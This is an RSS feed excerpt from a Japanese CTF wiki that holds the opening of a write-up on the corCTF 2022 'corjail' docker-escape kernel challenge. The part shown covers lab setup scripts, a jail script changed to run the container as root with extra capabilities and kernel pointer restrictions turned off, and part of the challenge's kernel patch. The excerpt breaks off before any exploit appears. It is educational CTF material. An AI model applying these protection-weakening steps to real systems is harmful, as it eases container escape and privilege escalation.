<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WIKIRBY – CoRCTF</title><link>https://wiki.smallkirby.xyz/ctf/cor-ctf/</link><description>Recent content in CoRCTF on WIKIRBY</description><generator>Hugo -- gohugo.io</generator><language>jp</language><atom:link href="https://wiki.smallkirby.xyz/ctf/cor-ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>Ctf: corjail</title><link>https://wiki.smallkirby.xyz/ctf/cor-ctf/corjail/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://wiki.smallkirby.xyz/ctf/cor-ctf/corjail/</guid><description>
&lt;h2 id="イントロ">イントロ&lt;/h2>
&lt;p>いちにょっき、ににょっき、さんにょっき！！こんにちは、ニートです。
最近は少しフロント周りを触っていたということで、となると反動でpwnがやりたくなる季節ですね。とはいっても今週からまた新しいインターンに行くことになっているので、様々な環境の変化に正気を保つのがギリギリな今日この頃。というわけで、今日は更に初めての経験をするべくdocker escape pwn問題を解いていきましょう。
解くのは&lt;strong>corCTF 2022&lt;/strong>の&lt;strong>corjail&lt;/strong>という問題。確か前回のエントリでもcorCTFの問題を解いた気がするのですが、このCTFの問題はかなり好きです。初めてのdocker escape問題ということで、解いてる時に詰まったところや失敗したところ等も含めて書き連ねていこうと思います。まぁ詰まったところと言ってもwriteupをカンニングしたんですけどね。ただ、これは気をつけていることと言うかpwnのwriteupを先に見る時にいつもやることですが、writeupは薄目で見るようにしています。細かいexploit内容は読まずに、keyword的なものだけピックアップして、それらをどう使うかは自分でちゃんと考えるみたいな。カンニングするにしても、最初っから全部見ちゃうとおもしろみがなくなっちゃうので。このエントリでは、色々試行錯誤したり詰まったところも含めたデバッグ風景も一緒に書いていこうと思います。&lt;/p>
&lt;h2 id="devenv-setup">devenv setup&lt;/h2>
&lt;p>まずは&lt;a href="https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail/task/build">GitHub&lt;/a>から問題をcloneしてきます。
配布ファイルがたくさんあるので、5分ほどuouoしましょう。
続いて&lt;code>build_kernel.sh&lt;/code>でKernelイメージをビルドします(スクリプト中だとシングルコアでビルドすることになっていて永遠に終わらないため、適宜修正しましょう)。
なんか途中でSSL周りのエラーが出るため、&lt;code>MODULES_SIG_ALL&lt;/code>らへんを無効化してしまいましょう。
続いて、&lt;code>build_image.sh&lt;/code>でゲストファイルシステムを作成します。一応いろいろなことをしているので、evilなことをされないか自分でスクリプトの中身を見ましょう。作成されるファイルは&lt;code>build/corors/coros.qcow2&lt;/code>です。QCOW形式のファイルは、以下の感じでmount/umountできます:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-mount.bash" data-lang="mount.bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">### mount.bash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set -eu
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MNTPOINT&lt;span style="color:#f92672">=&lt;/span>/tmp/hoge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>QCOW&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>realpath &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>PWD&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>/../build/coros/coros.qcow2&lt;span style="color:#66d9ef">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo modprobe nbd max_part&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir -p $MNTPOINT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo qemu-nbd --connect&lt;span style="color:#f92672">=&lt;/span>/dev/nbd0 &lt;span style="color:#e6db74">&amp;#34;&lt;/span>$QCOW&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo fdisk -l /dev/nbd0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo mount /dev/nbd0 $MNTPOINT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">### umount.bash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set -eu
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MNTPOINT&lt;span style="color:#f92672">=&lt;/span>/tmp/hoge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo umount $MNTPOINT &lt;span style="color:#f92672">||&lt;/span> true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo qemu-nbd --disconnect /dev/nbd0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo rmmod nbd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>さて、最初に起動フローを把握しておきます。上のスクリプトでマウントされたファイルシステムを見ると、&lt;code>/etc/inittab&lt;/code>は以下の感じです。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-inittab" data-lang="inittab">T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100
&lt;/code>&lt;/pre>&lt;p>普通ですね。続いて&lt;code>/etc/init.d/docker&lt;/code>あたりにdockerデーモンのサービススクリプトがありますが、これもまあ普通なので割愛。&lt;code>/etc/systemd/system/init.service&lt;/code>には以下のようにサービスが登録されています:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-/etc/systemd/system/init.service" data-lang="/etc/systemd/system/init.service">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[Unit]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">Description&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">Initialize challenge&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[Service]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">Type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">oneshot&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">ExecStart&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">/usr/local/bin/init&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[Install]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">WantedBy&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">multi-user.target&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ExecStart&lt;/code>である&lt;code>/usr/local/bin/init&lt;/code>はこんな感じ:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-/usr/local/bin/init.sh" data-lang="/usr/local/bin/init.sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>USER&lt;span style="color:#f92672">=&lt;/span>user
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>FLAG&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>head -n &lt;span style="color:#ae81ff">100&lt;/span> /dev/urandom | sha512sum | awk &lt;span style="color:#e6db74">&amp;#39;{printf $1}&amp;#39;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>useradd --create-home --shell /bin/bash $USER
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;export PS1=&amp;#39;\[\033[01;31m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# &amp;#39;&amp;#34;&lt;/span> &amp;gt;&amp;gt; /root/.bashrc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;export PS1=&amp;#39;\[\033[01;35m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &amp;#39;&amp;#34;&lt;/span> &amp;gt;&amp;gt; /home/$USER/.bashrc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod -r &lt;span style="color:#ae81ff">0700&lt;/span> /home/$USER
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mv /root/temp /root/$FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod &lt;span style="color:#ae81ff">0400&lt;/span> /root/$FLAG
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>新しいユーザ(&lt;code>user&lt;/code>)を作って、PS1をイかした感じにして、&lt;code>flag&lt;/code>をroot onlyにしているくらいです。続いて、&lt;code>/etc/passwd&lt;/code>はこんな感じ:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-/etc/passwd" data-lang="/etc/passwd">root:x:0:0:root:/root:/usr/local/bin/jail
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
(snipped...)
&lt;/code>&lt;/pre>&lt;p>&lt;code>root&lt;/code>のログインシェルが&lt;code>/usr/local/bin/jail&lt;/code>になっています:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-/usr/local/bin/jail.sh" data-lang="/usr/local/bin/jail.sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo -e &lt;span style="color:#e6db74">&amp;#39;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/bin/docker run -it --user user --hostname CoRJail --security-opt seccomp&lt;span style="color:#f92672">=&lt;/span>/etc/docker/corjail.json -v /proc/cormon:/proc_rw/cormon:rw corcontainer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/sbin/poweroff -f
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>user&lt;/code>としてdockerを起動したあと、&lt;code>poweroff&lt;/code>をしていますね。ここがメインの処理みたいです。&lt;code>--security-opt seccomp=/etc/docker/corjail.json&lt;/code>を指定していますが、seccomp filterの内容は後ほど見ていくことにします。&lt;code>/proc/cormon&lt;/code>という謎のproc fsもバインドマウントしていますが、これも後ほど見ていくことにします。
というわけで、ゲストOSのroot(not on docker)を触りたいときには、&lt;code>/etc/passwd&lt;/code>のログインシェルを&lt;code>/bin/bash&lt;/code>あたりにしておけばいいことがわかりました。rootで&lt;code>docker images&lt;/code>してみると、以下の感じ:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-.bash" data-lang=".bash">&lt;span style="display:flex;">&lt;span>root@CoROS:~# docker images
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>REPOSITORY TAG IMAGE ID CREATED SIZE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>corcontainer latest 8279763e02ce &lt;span style="color:#ae81ff">2&lt;/span> months ago 84.7MB
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>debian bullseye-slim c9cb6c086ef7 &lt;span style="color:#ae81ff">3&lt;/span> months ago 80.4MB
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先程&lt;code>jail&lt;/code>の中でも指定されていた&lt;code>corcontainer&lt;/code>がありますね。これはどうやってつくられたのでしょう。&lt;code>build_image.sh&lt;/code>を見てみると、以下の記述があります:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-build_image.sh" data-lang="build_image.sh">&lt;span style="display:flex;">&lt;span>tar -xzvf coros/files/docker/image/image.tar.gz -C coros/files/docker
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cp -rp coros/files/docker/var/lib/docker $FS/var/lib/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rm -rf coros/files/docker/var
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Docker imageは予め作られたものを使っているようです。デバッグ時には常に最新のexploitをguest OSのdockerコンテナ上に置いておきたいので、&lt;code>/usr/local/bin/jail&lt;/code>を以下のように変更しておきましょう:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-/usrr/local/bin/jail.sh" data-lang="/usrr/local/bin/jail.sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo -e &lt;span style="color:#e6db74">&amp;#39;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cp /exploit /home/user &lt;span style="color:#f92672">||&lt;/span> echo &lt;span style="color:#e6db74">&amp;#34;[!] exploit not found, skipping&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chown -R user:user /home/user
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#ae81ff">0&lt;/span> &amp;gt; /proc/sys/kernel/kptr_restrict
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/bin/docker run -it --user root &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> --hostname CoRJail &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> --security-opt seccomp&lt;span style="color:#f92672">=&lt;/span>/etc/docker/corjail.json &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> --add-cap CAP_SYSLOG &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -v /proc/cormon:/proc_rw/cormon:rw &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -v /home/user/:/home/user/host &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> corcontainer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/sbin/poweroff -f
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>あとは&lt;code>exploit&lt;/code>をguestのファイルシステムにおいておけば、勝手にコンテナ内の&lt;code>/home/user/exploit&lt;/code>に配置されて便利ですね。ついでに&lt;code>CAP_SYSLOG&lt;/code>を与えることで&lt;code>/proc/kallsysm&lt;/code>を見れるようにしています。
因みに諸々のめんどくさいことは、&lt;a href="https://github.com/smallkirby/lysithea">lysithea&lt;/a>が全部面倒見てくれるので、最初のセットアップを除くと実際には以下のコマンドを打つだけです:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-lysithea.bash" data-lang="lysithea.bash">&lt;span style="display:flex;">&lt;span>lysithea init &lt;span style="color:#75715e"># first time only&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lysithea extract &lt;span style="color:#75715e"># first time only&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lysithea local
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="static-analysis">static analysis&lt;/h2>
&lt;h3 id="misc">misc&lt;/h3>
&lt;p>lysithea曰く:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-lysithea.bash" data-lang="lysithea.bash">&lt;span style="display:flex;">&lt;span>root@CoRJail:/home/user/host# ./drothea --verbose
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Drothea v1.0.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>.&lt;span style="color:#f92672">]&lt;/span> kernel version:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Linux version 5.10.127 &lt;span style="color:#f92672">(&lt;/span>root@VPS&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">)&lt;/span> 8.3.0, GNU ld &lt;span style="color:#f92672">(&lt;/span>GNU Binutils &lt;span style="color:#66d9ef">for&lt;/span> Debian&lt;span style="color:#f92672">)&lt;/span> 2.31.1&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#75715e">#2 SMP Thu January 1 00:00:00 UTC 2030&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>-&lt;span style="color:#f92672">]&lt;/span> CONFIG_KALLSYMS_ALL is enabled.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>!&lt;span style="color:#f92672">]&lt;/span> unprivileged ebpf installation is enabled.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat: /proc/sys/vm/unprivileged_userfaultfd: No such file or directory
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>-&lt;span style="color:#f92672">]&lt;/span> unprivileged userfaultfd is disabled.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>?&lt;span style="color:#f92672">]&lt;/span> KASLR seems enabled. Should turn off &lt;span style="color:#66d9ef">for&lt;/span> debug purpose.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>?&lt;span style="color:#f92672">]&lt;/span> kptr seems restricted. Should try &lt;span style="color:#e6db74">&amp;#39;echo 0 &amp;gt; /proc/sys/kernel/kptr_restrict&amp;#39;&lt;/span> in init script.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@CoRJail:/home/user/host# ./ingrid --verbose
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ingrid v1.0.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>-&lt;span style="color:#f92672">]&lt;/span> userfualtfd is disabled.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>-&lt;span style="color:#f92672">]&lt;/span> CONFIG_DEVMEM is disabled.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>基本的セキュリティ機構は全部有効です。さて、kernelのビルドスクリプト(&lt;code>build_kernel.sh&lt;/code>を読むと、以下のようなパッチがあたっています:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-patch.diff" data-lang="patch.diff">&lt;span style="display:flex;">&lt;span>diff -ruN a/arch/x86/entry/syscall_64.c b/arch/x86/entry/syscall_64.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">--- a/arch/x86/entry/syscall_64.c 2022-06-29 08:59:54.000000000 +0200
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/arch/x86/entry/syscall_64.c 2022-07-02 12:34:11.237778657 +0200
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">&lt;/span>&lt;span style="color:#75715e">@@ -17,6 +17,9 @@
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> #define __SYSCALL_64(nr, sym) [nr] = __x64_##sym,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+EXPORT_PER_CPU_SYMBOL(__per_cpu_syscall_count);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">&lt;/span> asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /*
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Smells like a compiler bug -- it doesn&amp;#39;t work
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>diff -ruN a/arch/x86/include/asm/syscall_wrapper.h b/arch/x86/include/asm/syscall_wrapper.h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">--- a/arch/x86/include/asm/syscall_wrapper.h 2022-06-29 08:59:54.000000000 +0200
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/arch/x86/include/asm/syscall_wrapper.h 2022-07-02 12:34:11.237778657 +0200
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">&lt;/span>&lt;span style="color:#75715e">@@ -219,9 +220,41 @@
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> #define SYSCALL_DEFINE_MAXARGS 6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-#define SYSCALL_DEFINEx(x, sname, ...) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">- SYSCALL_METADATA(sname, x, __VA_ARGS__) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">- __SYSCALL_DEFINEx(x, sname, __VA_ARGS__)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+DECLARE_PER_CPU(u64[], __per_cpu_syscall_count);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+#define SYSCALL_COUNT_DECLAREx(sname, x, ...) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__));
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+#define __SYSCALL_COUNT(syscall_nr) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ this_cpu_inc(__per_cpu_syscall_count[(syscall_nr)])
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+#define SYSCALL_COUNT_FUNCx(sname, x, ...) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ { \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ __SYSCALL_COUNT(__syscall_meta_##sname.syscall_nr); \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ return __count_sys##sname(__MAP(x, __SC_CAST, __VA_ARGS__)); \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ } \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+#define SYSCALL_COUNT_DECLARE0(sname) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ static inline long __count_sys_##sname(void);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+#define SYSCALL_COUNT_FUNC0(sname) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ { \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ __SYSCALL_COUNT(__syscall_meta__##sname.syscall_nr); \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ return __count_sys_##sname(); \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ } \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ static inline long __count_sys_##sname(void)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+#define SYSCALL_DEFINEx(x, sname, ...) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ SYSCALL_METADATA(sname, x, __VA_ARGS__) \
